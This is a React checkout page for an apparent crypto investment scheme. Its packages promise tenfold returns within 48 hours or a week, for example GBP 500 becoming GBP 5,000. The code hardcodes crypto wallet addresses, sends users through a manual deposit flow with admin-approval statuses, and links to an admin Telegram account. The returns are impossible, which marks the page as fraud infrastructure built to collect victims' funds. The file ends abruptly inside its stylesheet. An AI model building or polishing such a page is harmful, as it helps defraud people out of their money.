import { useCallback, useEffect, useMemo, useState } from "react";
import { apiBase } from "../lib/api";

const ITEMS = [
  { id: "daily-500", icon: "48", pool: "48H POOL", name: "Capital 500", desc: "Capital GBP 500 -> Returns GBP 5,000 (48h)", deposit: "GBP 500", target: "GBP 5,000", amountValue: "500", amountAsset: "GBP" },
  { id: "daily-600", icon: "48", pool: "48H POOL", name: "Capital 600", desc: "Capital GBP 600 -> Returns GBP 6,000 (48h)", deposit: "GBP 600", target: "GBP 6,000", amountValue: "600", amountAsset: "GBP" },
  { id: "daily-700", icon: "48", pool: "48H POOL", name: "Capital 700", desc: "Capital GBP 700 -> Returns GBP 7,000 (48h)", deposit: "GBP 700", target: "GBP 7,000", amountValue: "700", amountAsset: "GBP" },
  { id: "daily-800", icon: "48", pool: "48H POOL", name: "Capital 800", desc: "Capital GBP 800 -> Returns GBP 8,000 (48h)", deposit: "GBP 800", target: "GBP 8,000", amountValue: "800", amountAsset: "GBP" },
  { id: "daily-900", icon: "48", pool: "48H POOL", name: "Capital 900", desc: "Capital GBP 900 -> Returns GBP 9,000 (48h)", deposit: "GBP 900", target: "GBP 9,000", amountValue: "900", amountAsset: "GBP" },
  { id: "daily-1000", icon: "48", pool: "48H POOL", name: "Capital 1,000", desc: "Capital GBP 1,000 -> Returns GBP 10,000 (48h)", deposit: "GBP 1,000", target: "GBP 10,000", amountValue: "1000", amountAsset: "GBP" },
  { id: "weekly-2000", icon: "W", pool: "WEEKLY POOL", name: "Capital 2,000", desc: "Capital GBP 2,000 -> Returns GBP 20,000", deposit: "GBP 2,000", target: "GBP 20,000", amountValue: "2000", amountAsset: "GBP" },
  { id: "weekly-3000", icon: "W", pool: "WEEKLY POOL", name: "Capital 3,000", desc: "Capital GBP 3,000 -> Returns GBP 30,000", deposit: "GBP 3,000", target: "GBP 30,000", amountValue: "3000", amountAsset: "GBP" },
  { id: "weekly-4000", icon: "W", pool: "WEEKLY POOL", name: "Capital 4,000", desc: "Capital GBP 4,000 -> Returns GBP 40,000", deposit: "GBP 4,000", target: "GBP 40,000", amountValue: "4000", amountAsset: "GBP" },
  { id: "weekly-5000", icon: "W", pool: "WEEKLY POOL", name: "Capital 5,000", desc: "Capital GBP 5,000 -> Returns GBP 50,000", deposit: "GBP 5,000", target: "GBP 50,000", amountValue: "5000", amountAsset: "GBP" },
  { id: "weekly-6000", icon: "W", pool: "WEEKLY POOL", name: "Capital 6,000", desc: "Capital GBP 6,000 -> Returns GBP 60,000", deposit: "GBP 6,000", target: "GBP 60,000", amountValue: "6000", amountAsset: "GBP" },
  { id: "weekly-7000", icon: "W", pool: "WEEKLY POOL", name: "Capital 7,000", desc: "Capital GBP 7,000 -> Returns GBP 70,000", deposit: "GBP 7,000", target: "GBP 70,000", amountValue: "7000", amountAsset: "GBP" }
];

const NETWORK_OPTIONS = [
  { id: "BTC", label: "BTC", chain: "BTC", asset: "BTC", quoteAsset: "BTC" },
  { id: "ETH", label: "Ethereum", chain: "ERC20", asset: "ETH", quoteAsset: "ETH" },
  { id: "SOLANA", label: "Solana", chain: "SOL", asset: "SOL", quoteAsset: "SOL" },
  { id: "BNB", label: "BNB", chain: "BEP20", asset: "BNB", quoteAsset: "BNB" },
  { id: "USDT_TRC20", label: "USDT (TRC20)", chain: "TRC20", asset: "USDT", quoteAsset: "USDT" },
  { id: "USDT", label: "USDT", chain: "ERC20", asset: "USDT", quoteAsset: "USDT" },
  { id: "USDC", label: "USDC", chain: "ERC20", asset: "USDC", quoteAsset: "USDT" }
];

const WALLET_BY_NETWORK = {
  BTC: "bc1qj60zen3keyt2kyrv063rzm88x2se853h5dmcmu",
  ETH: "0x5de7a2adeb34365d666e2bfde2aa1bc1bbb896d3",
  SOLANA: "2rxKRK6WLpS6K4Tb4AGfracE4d3bcfGTwtp5Ca1t9Bba",
  BNB: "0x5de7a2adeb34365d666e2bfde2aa1bc1bbb896d3",
  USDT_TRC20: "TMAiFTJdSWPa4qmYytovK1iEFBPc2ADPar",
  USDT: "0x5de7a2adeb34365d666e2bfde2aa1bc1bbb896d3",
  USDC: "0x5de7a2adeb34365d666e2bfde2aa1bc1bbb896d3"
};

const ADMIN_TELEGRAM_URL = (typeof import.meta !== "undefined" && import.meta.env && import.meta.env.VITE_ADMIN_TELEGRAM_URL)
  ? String(import.meta.env.VITE_ADMIN_TELEGRAM_URL)
  : "https://t.me/your_admin";

function friendlyApiError(status, backendMsg, context) {
  const msg = String(backendMsg || "").trim();
  if (msg) return msg;
  if (status === 400) return `Some required payment details are invalid. Please review the ${context} form and try again.`;
  if (status === 401) return "Your session has expired. Please log in again, then retry your payment.";
  if (status === 403) return "You do not have permission to perform this payment action.";
  if (status === 404) return "Payment service endpoint was not found. The checkout backend may be offline or misconfigured.";
  if (status === 409) return "This payment request conflicts with an existing one. Please refresh and try again.";
  if (status >= 500) return "Payment server is temporarily unavailable. Please try again in a moment.";
  return "Unable to complete this payment request right now. Please try again.";
}

function joinApi(base, path) {
  const b = String(base || "").trim().replace(/\/+$/, "");
  if (!b) return path;
  return `${b}${path.startsWith("/") ? "" : "/"}${path}`;
}

function buildApiCandidates() {
  const list = [];
  const primary = apiBase();
  if (primary) list.push(primary);
  if (typeof window !== "undefined") {
    const host = String(window.location.hostname || "").toLowerCase();
    if (host === "localhost" || host === "127.0.0.1") {
      list.push("http://localhost:8787");
      list.push("http://127.0.0.1:8787");
    }
  }
  list.push("");
  try {
    const override = typeof window !== "undefined" ? String(window.localStorage.getItem("tf_api_base") || "").trim() : "";
    if (override) list.push(override);
  } catch {}
  // Fallback backend endpoint for separated frontend/backend deployment.
  list.push("https://investment-backend-9nxb.onrender.com");
  const seen = new Set();
  return list
    .map((x) => String(x || "").trim().replace(/\/+$/, ""))
    .filter((x) => {
      if (seen.has(x)) return false;
      seen.add(x);
      return true;
    });
}

async function fetchApiWithFallback(paths, options, context) {
  const pathList = Array.isArray(paths) ? paths : [paths];
  const candidates = buildApiCandidates();
  const tried = [];
  let sawAuthError = false;
  for (const base of candidates) {
    for (const path of pathList) {
      const url = joinApi(base, path);
      try {
        const res = await fetch(url, options);
        const ct = String(res.headers.get("content-type") || "").toLowerCase();
        const j = await res.json().catch(() => ({}));

        if (res.ok) {
          // If a frontend host rewrites unknown API paths to index.html, don't treat it as success.
          if (ct.includes("text/html")) {
            tried.push(`HTML from ${url}`);
            continue;
          }
          return { res, json: j, url };
        }

        tried.push(`${res.status} ${url}`);
        if (res.status === 401 || res.status === 403) {
          sawAuthError = true;
          throw new Error("Please login first to invest. Go to Portfolio, sign in, then return to Checkout.");
        }
        if (res.status === 404) continue;
        throw new Error(friendlyApiError(res.status, j?.error, context));
      } catch (err) {
        const msg = String(err?.message || "");
        if (msg && (/login first to invest/i.test(msg) || /session has expired/i.test(msg))) {
          throw err;
        }
        if (msg && !msg.includes("Payment")) {
          tried.push(`network ${url}`);
          continue;
        }
        throw err;
      }
    }
  }

  if (sawAuthError) {
    throw new Error("Please login first to invest. Go to Portfolio, sign in, then return to Checkout.");
  }

  const detail = tried.length ? ` Tried: ${tried.slice(0, 6).join(" | ")}` : "";
  throw new Error(
    "Payment backend could not be reached from this checkout. Please contact support and share this message." + detail
  );
}

const DEPOSIT_POST_PATHS = ["/api/deposits", "/deposits", "/api/ui/deposits"];
const DEPOSIT_ME_PATHS = ["/api/deposits/me", "/deposits/me", "/api/ui/deposits/me"];
const DEPOSIT_QUOTE_PATHS = ["/api/deposits/quote", "/deposits/quote", "/api/ui/deposits/quote"];
const AUTH_ME_PATHS = ["/api/auth/me"];

async function createDepositWithFallback(payload) {
  return fetchApiWithFallback(
    DEPOSIT_POST_PATHS,
    {
      method: "POST",
      credentials: "include",
      cache: "no-store",
      headers: { "Content-Type": "application/json", Accept: "application/json" },
      body: JSON.stringify(payload)
    },
    "checkout"
  );
}

async function getDepositsWithFallback() {
  return fetchApiWithFallback(
    DEPOSIT_ME_PATHS,
    {
      method: "GET",
      credentials: "include",
      headers: { Accept: "application/json" }
    },
    "payment status"
  );
}

async function getDepositQuoteWithFallback({ amount, from, to }) {
  const q = new URLSearchParams({
    amount: String(amount),
    from: String(from || "EUR").toUpperCase(),
    to: String(to || "BTC").toUpperCase()
  }).toString();
  const paths = DEPOSIT_QUOTE_PATHS.map((p) => `${p}?${q}`);
  return fetchApiWithFallback(
    paths,
    {
      method: "GET",
      credentials: "include",
      cache: "no-store",
      headers: { Accept: "application/json" }
    },
    "quote"
  );
}

async function getAuthMeWithFallback() {
  return fetchApiWithFallback(
    AUTH_ME_PATHS,
    {
      method: "GET",
      credentials: "include",
      cache: "no-store",
      headers: { Accept: "application/json" }
    },
    "profile"
  );
}

export default function CheckoutPage() {
  const [fullName, setFullName] = useState("");
  const [country, setCountry] = useState("United States");
  const [btcAmount, setBtcAmount] = useState("0.01000000");
  const [packageId, setPackageId] = useState(ITEMS[0]?.id || "");
  const [networkId, setNetworkId] = useState("BTC");
  const [quoteSource, setQuoteSource] = useState("");
  const [quoteLoading, setQuoteLoading] = useState(false);
  const [quoteHint, setQuoteHint] = useState("");
  const [quoteError, setQuoteError] = useState("");
  const [referenceCopied, setReferenceCopied] = useState(false);
  const [walletCopied, setWalletCopied] = useState(false);
  const [loading, setLoading] = useState(false);
  const [invoiceReady, setInvoiceReady] = useState(false);
  const [requestId, setRequestId] = useState("");
  const [invoiceMsg, setInvoiceMsg] = useState("");
  const [paymentStatus, setPaymentStatus] = useState("awaiting_payment");
  const [checkingStatus, setCheckingStatus] = useState(false);
  const [investStartedAt, setInvestStartedAt] = useState(0);
  const [waitNow, setWaitNow] = useState(Date.now());
  const [confirmed, setConfirmed] = useState(false);
  const [errors, setErrors] = useState({});

  const selectedNetwork = useMemo(
    () => NETWORK_OPTIONS.find((x) => x.id === networkId) || NETWORK_OPTIONS[0],
    [networkId]
  );
  const selectedPackage = useMemo(
    () => ITEMS.find((x) => x.id === packageId) || ITEMS[0],
    [packageId]
  );
  const selectedWalletAddress = useMemo(
    () => WALLET_BY_NETWORK[networkId] || "",
    [networkId]
  );
  const baseAmount = useMemo(() => {
    const raw = Number(selectedPackage?.amountValue || 0);
    return Number.isFinite(raw) && raw > 0 ? raw : 0;
  }, [selectedPackage]);
  const baseAsset = useMemo(
    () => String(selectedPackage?.amountAsset || "EUR").toUpperCase(),
    [selectedPackage]
  );
  const checkoutReference = useMemo(
    () => `TF-${String(selectedPackage?.id || "PKG").toUpperCase()}-${selectedNetwork.id}-${String(baseAmount || 0)}`,
    [selectedPackage, selectedNetwork, baseAmount]
  );
  const isQuoteReady = Boolean(!quoteLoading && quoteSource && quoteSource !== "compat" && !quoteError && Number(btcAmount) > 0);
  const waitElapsedSec = useMemo(() => {
    if (!investStartedAt) return 0;
    return Math.max(0, Math.floor((waitNow - investStartedAt) / 1000));
  }, [investStartedAt, waitNow]);
  const waitProgressPct = useMemo(() => Math.min(100, Math.round((waitElapsedSec / 900) * 100)), [waitElapsedSec]);
  const isLongWait = waitElapsedSec >= 600;

  const statusLabel = useMemo(() => {
    const s = String(paymentStatus || "").toLowerCase();
    if (s === "confirmed") return "Payment confirmed";
    if (s === "awaiting_payment") return "Awaiting wallet deposit";
    if (s === "failed") return "Payment failed";
    if (s === "expired") return "Invoice expired";
    if (s === "pending") return "Awaiting admin approval";
    return "Awaiting wallet deposit";
  }, [paymentStatus]);

  const checkoutProgress = useMemo(() => {
    if (confirmed) return { pct: 100, label: "Payment confirmed" };
    if (invoiceReady) return { pct: 72, label: "Investment session created - awaiting payment" };
    let score = 12;
    if (fullName.trim()) score += 22;
    if (country.trim()) score += 12;
    if (networkId) score += 20;
    const n = Number(btcAmount);
    if (Number.isFinite(n) && n > 0) score += 22;
    return { pct: Math.min(70, score), label: "Complete payment details" };
  }, [confirmed, invoiceReady, fullName, country, networkId, btcAmount]);

  function runValidation() {
    const next = {};
    if (!fullName.trim()) next.fullName = "Full name is required.";
    if (!packageId) next.packageId = "Select a package plan.";
    if (!Number.isFinite(baseAmount) || baseAmount <= 0) next.btcAmount = "A valid package amount is required.";
    if (!networkId) next.networkId = "Select a blockchain network.";
    if (!selectedWalletAddress) next.networkId = "No wallet address configured for this network.";
    if (quoteLoading) next.btcAmount = "Please wait while we fetch your conversion quote.";
    if (!quoteSource || quoteSource === "compat") next.btcAmount = "Live conversion quote is unavailable. Please try again in a moment.";
    setErrors(next);
    return Object.keys(next).length === 0;
  }

  const refreshQuote = useCallback(async () => {
    const targetAsset = String(selectedNetwork?.quoteAsset || selectedNetwork?.asset || "BTC").toUpperCase();
    setQuoteHint("");
    setQuoteError("");
    if (!Number.isFinite(baseAmount) || baseAmount <= 0) {
      setBtcAmount("");
      return false;
    }
    setQuoteLoading(true);
    try {
      const { json: j } = await getDepositQuoteWithFallback({
        amount: baseAmount,
        from: baseAsset,
        to: targetAsset
      });
      const quoteAmount = Number(j?.quote?.amount_to);
      if (!Number.isFinite(quoteAmount) || quoteAmount <= 0) throw new Error("Quote amount is invalid.");
      setBtcAmount(String(quoteAmount));
      setQuoteSource(String(j?.quote?.source || "server"));
      setQuoteHint("");
      setQuoteError("");
      return true;
    } catch (err) {
      setBtcAmount("");
      setQuoteSource("compat");
      setQuoteHint("");
      setQuoteError(
        typeof err?.message === "string" && err.message.trim()
          ? err.message
          : "Live conversion quote is currently unavailable. Please wait a moment and retry."
      );
      return false;
    } finally {
      setQuoteLoading(false);
    }
  }, [baseAmount, baseAsset, selectedNetwork]);

  useEffect(() => {
    void refreshQuote();
  }, [refreshQuote]);

  useEffect(() => {
    let dead = false;
    async function prefillContact() {
      try {
        const { json: j } = await getAuthMeWithFallback();
        const u = j?.user && typeof j.user === "object" ? j.user : null;
        if (!u || dead) return;
        const first = String(u.first_name || "").trim();
        const last = String(u.last_name || "").trim();
        const display = [first, last].filter(Boolean).join(" ").trim();
        const fallback = String(u.email || "").split("@")[0] || "";
        const nextName = (display || fallback).trim();
        if (nextName && !fullName.trim()) setFullName(nextName);
      } catch {}
    }
    void prefillContact();
    return () => {
      dead = true;
    };
  }, [fullName]);

  async function copyReference() {
    try {
      await navigator.clipboard.writeText(checkoutReference);
      setReferenceCopied(true);
      window.setTimeout(() => setReferenceCopied(false), 1200);
    } catch {}
  }

  async function copyWalletAddress() {
    try {
      await navigator.clipboard.writeText(selectedWalletAddress);
      setWalletCopied(true);
      window.setTimeout(() => setWalletCopied(false), 1200);
    } catch {}
  }

  async function onPay(e) {
    e.preventDefault();
    if (!runValidation()) return;
    if (!quoteSource || quoteSource === "compat") {
      setInvoiceMsg("Cannot create invoice right now because conversion quote is unavailable. Please retry shortly.");
      return;
    }
    setLoading(true);
    setInvoiceMsg("");
    setConfirmed(false);
    setPaymentStatus("awaiting_payment");
    setRequestId("");
    setInvestStartedAt(0);
    try {
      const { json: j } = await createDepositWithFallback({
        amount: baseAmount,
        base_amount: baseAmount,
        base_asset: baseAsset,
        convert: true,
        asset: selectedNetwork.quoteAsset || selectedNetwork.asset || "BTC",
        method: "Crypto Manual Wallet",
        chain: selectedNetwork.chain || "BTC",
        reference: `checkout-${Date.now()}`,
        note: `Manual invest for ${fullName} | country=${country} | package=${selectedPackage?.id || "n/a"} | network=${selectedNetwork.label} | wallet=${selectedWalletAddress}`
      });
      const finalAmount = Number(j?.request?.amount);
      if (Number.isFinite(finalAmount) && finalAmount > 0) setBtcAmount(String(finalAmount));
      const id = typeof j?.request?.id === "string" ? j.request.id.trim() : "";
      const initialStatus = typeof j?.request?.status === "string" ? j.request.status.trim().toLowerCase() : "awaiting_payment";
      if (!id) throw new Error("Deposit request created but request id is missing.");
      setRequestId(id);
      setPaymentStatus(initialStatus || "awaiting_payment");
      setInvoiceReady(true);
      setInvestStartedAt(Date.now());
      setInvoiceMsg("Transfer initiated. Send funds to the wallet below and then use Check Status.");
    } catch (err) {
      setInvoiceMsg(typeof err?.message === "string" ? err.message : "Unable to start invest session.");
    } finally {
      setLoading(false);
    }
  }

  async function checkPaymentStatus() {
    if (!requestId) return;
    setCheckingStatus(true);
    try {
      const { json: j } = await getDepositsWithFallback();
      const items = Array.isArray(j?.items) ? j.items : [];
      const row = items.find((x) => String(x?.id || "") === requestId);
      if (!row) throw new Error("Deposit request not found for this session.");
      const s = String(row?.status || "awaiting_payment").toLowerCase();
      setPaymentStatus(s);
      if (s === "confirmed") {
        setConfirmed(true);
        setInvoiceMsg("");
      } else if (s === "failed" || s === "expired" || s === "cancelled" || s === "rejected") {
        setInvoiceMsg(`Invoice status: ${s}. Create a new BTC invoice and try again.`);
      }
    } catch (err) {
      setInvoiceMsg(typeof err?.message === "string" ? err.message : "Unable to refresh payment status.");
    } finally {
      setCheckingStatus(false);
    }
  }

  useEffect(() => {
    if (!invoiceReady || !requestId || confirmed) return;
    const t = window.setInterval(() => {
      void checkPaymentStatus();
    }, 5000);
    return () => window.clearInterval(t);
  }, [invoiceReady, requestId, confirmed]);

  useEffect(() => {
    if (!invoiceReady || confirmed || !investStartedAt) return;
    const t = window.setInterval(() => setWaitNow(Date.now()), 1000);
    return () => window.clearInterval(t);
  }, [invoiceReady, confirmed, investStartedAt]);

  useEffect(() => {
    if (!confirmed) return;
    const t = window.setTimeout(() => {
      window.location.href = "/dashboard";
    }, 3000);
    return () => window.clearTimeout(t);
  }, [confirmed]);

  return (
    <div className="checkoutRoot">
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Sans:wght@400;500;700;800&display=swap');
        .checkoutRoot {
          --color-primary:#16a34a;
          min-height:100vh;
          background:
            radial-gradient(1200px 420px at -10% -8%, rgba(22,163,74,.16), transparent 62%),
            radial-gradient(900px 340px at 110% 0%, rgba(21,128,61,.10), transparent 55%),
            linear-gradient(180deg, #f6fef8 0%, #f0fdf4 100%);
          color:#111827;
          font-family:"DM Sans",sans-serif;
        }
        .checkoutTopBar { position:fixed; top:0; left:0; right:0; height:4px; background:#16a34a; z-index:40; }
        .checkoutNav { position:sticky; top:0; z-index:30; background:rgba(255,255,255,0.96); border-bottom:1px solid #dcfce7; backdrop-filter: blur(10px); box-shadow:0 8px 24px rgba(17,24,39,.06); }
        .checkoutNavInner { max-width:80rem; margin:0 auto; padding:14px 24px; display:flex; align-items:center; justify-content:space-between; gap:12px; }
        .checkoutNavActions { display:inline-flex; align-items:center; gap:12px; }
        .checkoutHomeBtn {
          display:inline-flex; align-items:center; justify-content:center;
          min-height:42px; padding:0 18px; border-radius:999px;
          background:#16a34a; color:#fff; border:1px solid #15803d;
          font-size:14px; font-weight:800; letter-spacing:0.01em; text-decoration:none;
          box-shadow:0 10px 24px rgba(22,163,74,.36);
          animation:homePulse 2s ease-in-out infinite;
        }
        .checkoutHomeBtn:hover { background:#15803d; }
        .checkoutHomeBtn:focus-visible { outline:3px solid #bbf7d0; outline-offset:2px; }
        .checkoutHomeBtn svg { width:14px; height:14px; margin-right:6px; }
        .checkoutFloatingHome {
          position:fixed; right:16px; bottom:18px; z-index:45;
          display:none; align-items:center; gap:6px;
          min-height:44px; padding:0 14px;
          border-radius:999px; background:#16a34a; color:#fff;
          border:1px solid #15803d; text-decoration:none; font-size:13px; font-weight:800;
          box-shadow:0 14px 28px rgba(22,163,74,.35);
        }
        .checkoutFloatingHome:hover { background:#15803d; }
        @media (max-width: 920px) {
          .checkoutFloatingHome { display:inline-flex; }
          .checkoutNavActions .checkoutHomeBtn { display:none; }
        }
        .checkoutLogo { display:flex; align-items:center; gap:10px; font-weight:700; font-size:14px; }
        .checkoutLogoMark { width:30px; height:30px; border-radius:8px; background:#dcfce7; color:#15803d; display:grid; place-items:center; border:1px solid #bbf7d0; }
        .checkoutWrap { max-width:80rem; margin:0 auto; padding:26px 24px 24px; }
        .checkoutGrid { display:grid; grid-template-columns:1fr; gap:20px; }
        @media (min-width:1024px) { .checkoutGrid { grid-template-columns:1fr 1fr; } }
        .checkoutCard {
          background:
            linear-gradient(160deg, rgba(255,255,255,.98), rgba(249,250,251,.96));
          border:1px solid #ecfdf3;
          border-radius:20px;
          box-shadow:
            0 12px 32px rgba(16,24,40,.08),
            0 1px 0 rgba(255,255,255,.85) inset;
          padding:28px;
          position:relative;
          overflow:hidden;
          opacity:0;
          transform:translateY(10px);
          animation:fadeUp .48s ease forwards;
        }
        .checkoutCard::after {
          content:"";
          position:absolute;
          inset:0;
          border-radius:20px;
          border:1px solid rgba(22,163,74,.14);
          pointer-events:none;
        }
        .checkoutCard.delay { animation-delay:.15s; }
        .serif { font-family:"DM Serif Display",serif; letter-spacing:-0.02em; }
        .h2 { font-size:28px; margin:0; }
        .subtle { color:#6b7280; font-size:13px; }
        .summaryWatermark { position:absolute; right:-34px; top:48%; transform:translateY(-50%) rotate(-27deg); font-size:78px; font-weight:800; color:rgba(22,163,74,.05); pointer-events:none; }
        .lineItem { display:flex; justify-content:space-between; align-items:flex-start; gap:10px; padding:11px 0; border-bottom:1px dashed #e5e7eb; }
        .lineItem:hover { background:rgba(236,253,245,.45); border-radius:10px; }
        .lineLeft { display:flex; gap:10px; }
        .lineIcon { width:26px; height:26px; border-radius:999px; background:#dcfce7; color:#15803d; border:1px solid #bbf7d0; display:grid; place-items:center; font-size:11px; font-weight:800; }
        .lineName { font-weight:700; font-size:14px; }
        .lineDesc { color:#6b7280; font-size:12px; }
        .linePrice { font-size:14px; font-weight:700; }
        .totals { margin-top:14px; display:grid; gap:8px; font-size:14px; color:#4b5563; }
        .totalsRow { display:flex; justify-content:space-between; align-items:center; }
        .totalRow { margin-top:4px; border-top:1px solid #e5e7eb; padding-top:11px; }
        .totalVal { font-weight:800; font-size:30px; color:#15803d; letter-spacing:-0.02em; }
        .trust { margin-top:10px; border:1px solid #bbf7d0; background:#f0fdf4; border-radius:10px; padding:8px 10px; color:#15803d; font-size:12px; display:flex; align-items:center; gap:8px; }
        .testimonial { margin-top:18px; border:1px solid #f3f4f6; background:#f9fafb; border-radius:12px; padding:12px; }
        .quote { color:#4b5563; font-size:13px; }
        .person { margin-top:8px; display:flex; align-items:center; gap:8px; }
        .avatar { width:32px; height:32px; border-radius:999px; background:#d1d5db; }
        .sectionTitle { border-left:4px solid #16a34a; padding-left:10px; margin:0 0 10px; font-weight:700; font-size:13px; color:#1f2937; }
        .packageMeta {
          margin-top:8px;
          border:1px solid #bbf7d0;
          background:linear-gradient(140deg,#f0fdf4,#dcfce7);
          border-radius:12px;
          padding:10px 12px;
          font-size:12px;
          color:#166534;
          display:flex;
          justify-content:space-between;
          gap:10px;
          font-weight:700;
        }
        .networkDesigner {
          border: 1px solid #d1fae5;
          border-radius: 16px;
          background:
            radial-gradient(320px 120px at 100% 0%, rgba(16,185,129,.10), transparent 65%),
            linear-gradient(180deg, #ffffff, #f8fafc);
          padding: 12px;
          box-shadow:
            0 10px 24px rgba(15,23,42,.06),
            0 1px 0 rgba(255,255,255,.95) inset;
        }
        .networkDesignerHead {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 10px;
        }
        .networkGlyph {
          width: 34px;
          height: 34px;
          border-radius: 11px;
          border: 1px solid #86efac;
          background: linear-gradient(165deg, #dcfce7, #bbf7d0);
          color: #14532d;
          display: grid;
          place-items: center;
          font-size: 13px;
          font-weight: 900;
          letter-spacing: .03em;
        }
        .networkHeadTitle {
          font-size: 13px;
          font-weight: 800;
          color: #0f172a;
          letter-spacing: .01em;
        }
        .networkHeadSub {
          margin-top: 2px;
          font-size: 11px;
          color: #6b7280;
        }
        .networkSelectWrap {
          position: relative;
          border-radius: 14px;
          border: 1px solid #d1d5db;
          background: linear-gradient(180deg, #ffffff, #f8fafc);
          box-shadow:
            0 1px 0 rgba(255,255,255,.9) inset,
            0 8px 18px rgba(2,6,23,.06);
          transition: border-color .2s, box-shadow .2s, transform .2s;
        }
        .networkSelectWrap:hover {
          border-color: #86efac;
          box-shadow:
            0 1px 0 rgba(255,255,255,.95) inset,
            0 10px 20px rgba(22,163,74,.12);
        }
        .networkSelectWrap:focus-within {
          border-color: #22c55e;
          box-shadow:
            0 0 0 3px rgba(34,197,94,.2),
            0 12px 24px rgba(22,163,74,.16);
          transform: translateY(-1px);
        }
        .networkSelect {
          appearance: none;
          -webkit-appearance: none;
          -moz-appearance: none;
          width: 100%;
          border: 0;
          background: transparent;
          height: 52px;
          padding: 0 46px 0 14px;
          color: #0f172a;
          font-size: 14px;
          font-weight: 600;
          outline: none;
        }
        .networkSelectIcon {
          position: absolute;
          right: 12px;
          top: 50%;
          transform: translateY(-50%);
          width: 24px;
          height: 24px;
          border-radius: 999px;
          display: grid;
          place-items: center;
          color: #15803d;
          background: #ecfdf3;
          border: 1px solid #bbf7d0;
          pointer-events: none;
        }
        .networkMetaRow {
          margin-top: 10px;
          display: flex;
          gap: 8px;
          flex-wrap: wrap;
        }
        .networkChip {
          border-radius: 999px;
          border: 1px solid #bbf7d0;
          background: #f0fdf4;
          color: #166534;
          font-size: 11px;
          font-weight: 800;
          padding: 5px 10px;
          letter-spacing: .01em;
        }
        .formGrid { display:grid; gap:12px; }
        .twoCol { display:grid; gap:12px; grid-template-columns:1fr; }
        @media (min-width:640px) { .twoCol { grid-template-columns:1fr 1fr; } }
        .fieldWrap { position:relative; isolation:isolate; }
        .field {
          width:100%;
          border:1px solid #e5e7eb;
          border-radius:12px;
          padding:22px 14px 10px;
          font-size:14px;
          outline:none;
          background:#fff;
          color:#111827;
          caret-color:#111827;
          pointer-events:auto;
          position:relative;
          z-index:1;
          transition:border-color .2s, box-shadow .2s;
        }
        .field:hover { border-color:#86efac; }
        .field:focus { border-color:#22c55e; box-shadow:0 0 0 3px rgba(34,197,94,.22); }
        .fieldLabel { position:absolute; left:12px; top:50%; transform:translateY(-50%); background:#fff; padding:0 4px; color:#374151; font-size:13px; font-weight:500; transition:all .2s; pointer-events:none; }
        .fieldLabel { top:7px; transform:none; font-size:11px; color:#15803d; }
        .field:not(:placeholder-shown) + .fieldLabel, .field:focus + .fieldLabel { top:7px; transform:none; font-size:11px; color:#15803d; }
        .fieldError { margin-top:4px; color:#ef4444; font-size:11px; }
        .err .field { border-color:#ef4444; animation:shake .22s ease; }
        .invoiceMsg { margin-top:6px; font-size:12px; color:#ef4444; }
        .invoiceStatus {
          margin-top:10px;
          display:inline-flex;
          align-items:center;
          gap:8px;
          padding:7px 10px;
          border-radius:999px;
          border:1px solid #bbf7d0;
          background:#f0fdf4;
          color:#166534;
          font-size:12px;
          font-weight:700;
        }
        .invoiceStatus.isBad {
          border-color:#fecaca;
          background:#fef2f2;
          color:#991b1b;
        }
        .walletCard {
          margin-top:12px;
          border:1px solid #bbf7d0;
          background:#f8fff9;
          border-radius:12px;
          padding:10px;
          text-align:left;
        }
        .walletHead { display:flex; align-items:center; justify-content:space-between; gap:8px; font-size:12px; font-weight:800; color:#166534; }
        .walletAddress {
          margin-top:8px;
          border:1px dashed #86efac;
          background:#fff;
          border-radius:10px;
          padding:10px;
          font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
          font-size:12px;
          line-height:1.5;
          color:#111827;
          word-break: break-all;
        }
        .walletMeta { margin-top:8px; font-size:12px; color:#374151; }
        .waitTrack { margin-top:12px; width:100%; height:8px; border-radius:999px; background:#dcfce7; overflow:hidden; }
        .waitFill { height:100%; width:0%; background:linear-gradient(90deg,#16a34a,#22c55e); transition:width .35s ease; }
        .waitMeta { margin-top:6px; font-size:12px; color:#166534; font-weight:700; }
        .adminNotice {
          margin-top:10px;
          border:1px solid #fde68a;
          background:#fffbeb;
          color:#92400e;
          border-radius:10px;
          padding:10px;
          font-size:12px;
          text-align:left;
        }
        .stayNotice {
          margin-top: 12px;
          border: 2px solid #16a34a;
          background: linear-gradient(180deg, #ecfdf3, #dcfce7);
          color: #14532d;
          border-radius: 12px;
          padding: 12px 14px;
          font-size: 14px;
          font-weight: 800;
          text-align: center;
          letter-spacing: 0.01em;
          box-shadow: 0 10px 20px rgba(22, 163, 74, 0.16);
          animation: pulseStay 1.6s ease-in-out infinite;
        }
        .btcRail {
          border:1px solid #bbf7d0;
          border-radius:12px;
          background:#f0fdf4;
          color:#166534;
          padding:10px 12px;
          font-size:12px;
          font-weight:700;
        }
        .cardShell { position:relative; }
        .cardLeft { position:absolute; left:12px; top:50%; transform:translateY(-50%); color:#6b7280; }
        .cardField { padding-left:40px; padding-right:94px; }
        .cardRight { position:absolute; right:12px; top:50%; transform:translateY(-50%); font-size:11px; color:#6b7280; font-weight:700; }
        .tip { position:relative; display:inline-flex; width:18px; height:18px; border-radius:999px; border:1px solid #d1d5db; align-items:center; justify-content:center; font-size:11px; color:#6b7280; }
        .tipPop { opacity:0; pointer-events:none; position:absolute; right:0; top:-34px; background:#111827; color:#fff; font-size:11px; padding:4px 8px; border-radius:6px; transition:opacity .2s; white-space:nowrap; }
        .tip:hover .tipPop { opacity:1; }
        .payBtn { width:100%; border:0; border-radius:12px; background:linear-gradient(180deg,#16a34a,#15803d); color:#fff; padding:14px; font-size:16px; font-weight:700; cursor:pointer; position:relative; overflow:hidden; box-shadow:0 12px 24px rgba(22,163,74,.26); }
        .payBtn:hover { background:#15803d; }
        .payBtn::before { content:""; position:absolute; inset:0; background:linear-gradient(110deg,transparent 20%,rgba(255,255,255,.35) 45%,transparent 70%); transform:translateX(-120%); }
        .payBtn:hover::before { animation:shimmer .9s ease; }
        .payBtn::after {
          content:"";
          position:absolute;
          inset:-2px;
          border-radius:14px;
          border:1px solid rgba(187,247,208,.6);
          pointer-events:none;
        }
        .payInner { display:inline-flex; align-items:center; gap:8px; }
        .spinner { width:18px; height:18px; border-radius:999px; border:2px solid rgba(255,255,255,.42); border-top-color:#fff; animation:spin 1s linear infinite; }
        .badges { margin-top:10px; display:grid; grid-template-columns:repeat(3,minmax(0,1fr)); gap:8px; }
